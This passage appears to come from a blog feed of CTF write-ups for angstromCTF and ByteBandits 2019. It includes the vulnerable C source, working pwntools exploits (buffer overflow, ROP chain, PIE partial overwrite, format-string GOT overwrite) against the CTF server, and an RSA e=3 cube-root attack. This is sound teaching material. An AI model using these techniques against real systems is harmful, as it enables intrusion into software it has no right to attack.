+s <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;shell.actf.co&#34;</span>,<span style="color:#ae81ff">19305</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">152</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4011b6</span>)
+
+s<span style="color:#f92672">.</span>sendline(payload)
+s<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74"># result:
+</span><span style="color:#e6db74">$ python aquarium.py
+</span><span style="color:#e6db74">Enter the number of fish in your fish tank: Enter the size of the fish in your fish tank: Enter the amount of water in your fish tank: Enter the width of your fish tank: Enter the length of your fish tank: Enter the height of your fish tank: Enter the name of your fish tank: actf{overflowed_more_than_just_a_fish_tank}
+</span><span style="color:#e6db74">Segmentation fault (core dumped)
+</span><span style="color:#e6db74">$  
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span></code></pre></div>
+<h3 id="chain-of-rope-80pts">Chain Of Rope [80pts]</h3>
+
+<p><br>
+Source code of the challenge:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> userToken <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">int</span> balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">authorize</span> () {
+	userToken <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337</span>;
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">addBalance</span> (<span style="color:#66d9ef">int</span> pin) {
+	<span style="color:#66d9ef">if</span> (userToken <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1337</span> <span style="color:#f92672">&amp;&amp;</span> pin <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
+		balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242</span>;
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;ACCESS DENIED</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">flag</span> (<span style="color:#66d9ef">int</span> pin, <span style="color:#66d9ef">int</span> secret) {
+	<span style="color:#66d9ef">if</span> (userToken <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1337</span> <span style="color:#f92672">&amp;&amp;</span> balance <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4242</span> <span style="color:#f92672">&amp;&amp;</span> pin <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xba5eba11</span> <span style="color:#f92672">&amp;&amp;</span> secret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbedabb1e</span>) {
+		printf(<span style="color:#e6db74">&#34;Authenticated to purchase rope chain, sending free flag along with purchase...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>);
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;ACCESS DENIED</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getInfo</span> () {
+	printf(<span style="color:#e6db74">&#34;Token: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Balance: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, userToken, balance);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+	gid_t gid <span style="color:#f92672">=</span> getegid();
+	setresgid(gid, gid, gid);
+	setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	<span style="color:#66d9ef">char</span> name [<span style="color:#ae81ff">32</span>];
+	printf(<span style="color:#e6db74">&#34;--== ROPE CHAIN BLACK MARKET ==--</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;LIMITED TIME OFFER: Sending free flag along with any purchase.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;What would you like to do?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;1 - Set name</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;2 - Get user info</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;3 - Grant access</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">int</span> choice;
+	scanf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
+	<span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+		gets(name);
+	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+		getInfo();
+	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+		printf(<span style="color:#e6db74">&#34;lmao no</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;I don&#39;t know what you&#39;re saying so get out of my black market</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<p>Challange has two solutions. One of them is to craft a proper <code>ROP</code> chain that will call <code>flag</code> function with the proper arguments, howerver, it is also possible to directly jump to <code>0x401231</code>, setup <code>RDI</code> register and call <code>system(&quot;/bin/cat flag.txt&quot;);</code></p>
+
+<p>Intended solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;shell.actf.co&#34;</span>,<span style="color:#ae81ff">19400</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401196</span>) <span style="color:#75715e"># call authorize(), userToken = 1337</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401403</span>) <span style="color:#75715e"># pop rdi; ret</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4011ab</span>) <span style="color:#75715e"># call addBalance(0xdeadbeef)</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401403</span>) <span style="color:#75715e"># pop rdi; ret</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xba5eba11</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401401</span>) <span style="color:#75715e"># pop rsi; pop r15; ret</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xbedabb1e</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4011eb</span>) <span style="color:#75715e"># call flag(0xba5eba11,0xbedabb1e)</span>
+
+s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;?&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>)
+s<span style="color:#f92672">.</span>sendline(payload)
+s<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>Quick win solution:</p>
+
+<pre><code>~&gt; python -c 'print &quot;1\n&quot;+&quot;A&quot;*56+&quot;\x31\x12\x40\x00\x00\x00\x00&quot;' | nc shell.actf.co 19400 
+--== ROPE CHAIN BLACK MARKET ==--
+LIMITED TIME OFFER: Sending free flag along with any purchase.
+What would you like to do?
+1 - Set name
+2 - Get user info
+3 - Grant access
+actf{dark_web_bargains}Bus error (core dumped)
+</code></pre>
+
+<h3 id="pie-shop-100pts">Pie Shop [100pts]</h3>
+
+<p><br>
+Challenge source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+	system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_pie</span>() {
+	printf(<span style="color:#e6db74">&#34;What type of pie do you want? &#34;</span>);
+
+	<span style="color:#66d9ef">char</span> pie[<span style="color:#ae81ff">50</span>];
+	gets(pie);
+
+	<span style="color:#66d9ef">if</span> (strcmp(pie, <span style="color:#e6db74">&#34;apple&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+		printf(<span style="color:#e6db74">&#34;Here&#39;s your pie!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;      _,..---..,_</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;  ,-</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">`    .&#39;.    `</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34; ((      &#39;.&#39;.&#39;      ))</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;  `&#39;-.,_   &#39;   _,.-&#39;`</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;    `</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  `</span><span style="color:#ae81ff">\&#34;\&#34;\&#34;\&#34;\&#34;</span><span style="color:#e6db74">`  /`</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;      `</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">-----</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;Whoops, looks like we&#39;re out of that one.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+	gid_t gid <span style="color:#f92672">=</span> getegid();
+	setresgid(gid, gid, gid);
+	setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+
+	printf(<span style="color:#e6db74">&#34;Welcome to the pie shop! Here we have all types of pies: apple pies, peach pies, blueberry pies, position independent executables, pumpkin pies, rhubarb pies...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	get_pie();
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<pre><code>$ file pie_shop 
+pie_shop: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9318df53faeaad841153110c8ded995df882498b, not stripped
+
+(gdb) checksec
+[+] checksec for '/home/ubuntu/data/pie_shop'
+Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Partial
+</code></pre>
+
+<p>We are dealing with the <code>PIE</code> (Position Independed Executable) enabled binary.<br>
+Even though we have full controll over the return address and a quick win <code>flag</code> function, the binary will be mapped on random address in the memory, thus, <code>flag</code> function address will be random on each runtime:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb -batch -nh -ex <span style="color:#e6db74">&#39;set disable-randomization off&#39;</span> -ex <span style="color:#e6db74">&#39;start&#39;</span> -ex <span style="color:#e6db74">&#39;x flag&#39;</span> ./pie_shop
+Temporary breakpoint <span style="color:#ae81ff">1</span> at 0x1266
+
+Temporary breakpoint <span style="color:#ae81ff">1</span>, 0x000055b312c39266 in main <span style="color:#f92672">()</span>
+0x55b312c391a9 &lt;flag&gt;:	0xe5894855
+
+$ gdb -batch -nh -ex <span style="color:#e6db74">&#39;set disable-randomization off&#39;</span> -ex <span style="color:#e6db74">&#39;start&#39;</span> -ex <span style="color:#e6db74">&#39;x flag&#39;</span> ./pie_shop
+Temporary breakpoint <span style="color:#ae81ff">1</span> at 0x1266
+
+Temporary breakpoint <span style="color:#ae81ff">1</span>, 0x00005602214f7266 in main <span style="color:#f92672">()</span>
+0x5602214f71a9 &lt;flag&gt;:	0xe5894855</code></pre></div>
+<p>After spending some time I realized that I can give <code>partial overwrite</code> a try.
+We have control over <code>2</code> least significant bytes of the <code>rip</code>, however, our input is not alligned and the <code>null</code> byte will be appended (8 byte values on the stack).
+<br><br>
+Offset to the <code>flag</code> function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ readelf -s ./pie_shop | grep flag
+    <span style="color:#ae81ff">72</span>: 00000000000011a9    <span style="color:#ae81ff">19</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">13</span> flag</code></pre></div>
+<p>The <code>null</code> byte will be appended automatically due to the aligment issue, therefore, we should set <code>2</code> least significant bytes to: <code>11a9</code> and execute it hundreds/thousend times.
+<br><br>
+After coffee and a south park episode the flag arrived:<br></p>
+
+<pre><code>[redacted]@actf:/problems/2019/pie_shop$ python /tmp/[redacted]
+Whoops, looks like we're out of that one.
+actf{a_different_kind_of_pie}
+</code></pre>
+
+<p>Solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;error&#34;</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa9\x11</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">while</span> True:
+	p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;/problems/2019/pie_shop/pie_shop&#34;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;? &#34;</span>,payload)
+	d <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
+	p<span style="color:#f92672">.</span>close()
+	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;actf&#39;</span> <span style="color:#f92672">in</span> d:
+		<span style="color:#66d9ef">print</span> d</code></pre></div>
+<h3 id="purchases-120pts">Purchases [120pts]</h3>
+
+<p><br>
+Challenge source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+	system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+	gid_t gid <span style="color:#f92672">=</span> getegid();
+	setresgid(gid, gid, gid);
+	setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#66d9ef">char</span> item[<span style="color:#ae81ff">60</span>];
+	printf(<span style="color:#e6db74">&#34;What item would you like to purchase? &#34;</span>);
+	fgets(item, <span style="color:#66d9ef">sizeof</span>(item), stdin);
+	item[strlen(item)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+	<span style="color:#66d9ef">if</span> (strcmp(item, <span style="color:#e6db74">&#34;nothing&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+		printf(<span style="color:#e6db74">&#34;Then why did you even come here? &#34;</span>);
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;You don&#39;t have any money to buy &#34;</span>);
+		printf(item);
+		printf(<span style="color:#e6db74">&#34;s. You&#39;re wasting your time! We don&#39;t even sell &#34;</span>);
+		printf(item);
+		printf(<span style="color:#e6db74">&#34;s. Leave this place and buy &#34;</span>);
+		printf(item);
+		printf(<span style="color:#e6db74">&#34; somewhere else. &#34;</span>);
+	}
+
+	printf(<span style="color:#e6db74">&#34;Get out!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></div>
+<p>It&rsquo;s a vanilla format string vulnerability.<br> We have to overwrite the <code>GOT</code> entry for the <code>puts</code> function with the <code>flag</code> function address.</p>
+
+<p>Quick &amp; dirty solution (we are going to get ~12MB of data back) with single write:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;shell.actf.co&#39;</span>,<span style="color:#ae81ff">19011</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%4198838u</span><span style="color:#e6db74">%10$n&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;AA&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x40\x40</span><span style="color:#e6db74">&#34;</span>
+
+p<span style="color:#f92672">.</span>sendline(payload)
+<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvall()[<span style="color:#f92672">-</span><span style="color:#ae81ff">26</span>:])
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">~&gt; python purchases.py
+</span><span style="color:#e6db74">[+] Opening connection to shell.actf.co on port 19011: Done
+</span><span style="color:#e6db74">[+] Receiving all data: Done (12.01MB)
+</span><span style="color:#e6db74">[*] Closed connection to shell.actf.co port 19011
+</span><span style="color:#e6db74">actf{limited_edition_flag}
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span></code></pre></div>
+<h3 id="to-be-continued">To be continued..</h3>
+
+<p><br>
+<hr></p>
+<div class="footnotes">
+
+<hr />
+
+<ol>
+<li id="fn:1"><a href="https://github.com/angr" target="_blank">https://github.com/angr</a>
+ <a class="footnote-return" href="#fnref:1"><sup>[return]</sup></a></li>
+<li id="fn:2"><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Example" target="_blank">https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Example</a>
+ <a class="footnote-return" href="#fnref:2"><sup>[return]</sup></a></li>
+</ol>
+</div>
+]]></content>
+        </item>
+        
+        <item>
+            <title>ByteBandits CTF 2019</title>
+            <link>https://asimuntis.github.io/posts/2019/04/bytebandits-ctf-2019/</link>
+            <pubDate>Sat, 13 Apr 2019 00:00:00 +0000</pubDate>
+            
+            <guid>https://asimuntis.github.io/posts/2019/04/bytebandits-ctf-2019/</guid>
+            <description>First part of writeups for the Byte Bandits CTF 2019.
+RivestShamirAdleman We are given the following data:
+n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 e = 3 ciphertext = 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333  It&amp;rsquo;s a basic RSA challenge with small public exponent (e=3) and lack of proper padding. Even though n is chosen from strong primes and it&amp;rsquo;s quite big, it is still possible to break it.
+All we need to do is to compute the third root of C (ciphertext) to get the plaintext.</description>
+            <content type="html"><![CDATA[
+
+<p>First part of writeups for the Byte Bandits CTF 2019.</p>
+
+<h2 id="rivestshamiradleman">RivestShamirAdleman</h2>
+
+<p>We are given the following data:</p>
+
+<pre><code>n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623
+e = 3 
+ciphertext = 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333
+</code></pre>
+
+<p>It&rsquo;s a basic RSA challenge with small public exponent <code>(e=3)</code> and lack of proper padding. Even though <code>n</code> is chosen from strong primes and it&rsquo;s quite big, it is still possible to break it.</p>
+
+<p>All we need to do is to compute the third root of <code>C</code> (ciphertext) to get the plaintext. Small python script will do the trick:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://stackoverflow.com/questions/15978781/how-to-find-integer-nth-roots</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iroot</span>(k, n):
+    u, s <span style="color:#f92672">=</span> n, n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">while</span> u <span style="color:#f92672">&lt;</span> s:
+        s <span style="color:#f92672">=</span> u
+        t <span style="color:#f92672">=</span> (k<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> s <span style="color:#f92672">+</span> n <span style="color:#f92672">//</span> pow(s, k<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        u <span style="color:#f92672">=</span> t <span style="color:#f92672">//</span> k
+    <span style="color:#66d9ef">return</span> s
+
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333</span>
+
+d <span style="color:#f92672">=</span> iroot(<span style="color:#ae81ff">3</span>,c)
+<span style="color:#66d9ef">print</span> hex(d)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>)</code></pre></div>
+<p>Let&rsquo;s run it to get the flag:</p>
+
+<pre><code>[~]$ python2 solve.py
+flag{nO_paDDing00_rsa}
+</code></pre>
+
+<p>We can also go with the quick win with the RsaCtfTool:</p>
+
+<pre><code>$ python2 RsaCtfTool.py -n 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 -e 3 --uncipher 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333
+[+] Clear text : flag{nO_paDDing00_rsa}
+</code></pre>
+
+<h2 id="easyphp">EasyPHP</h2>
+
+<p>We are presented with the following source code:</p>
+
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 5
+</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 6
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">24
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
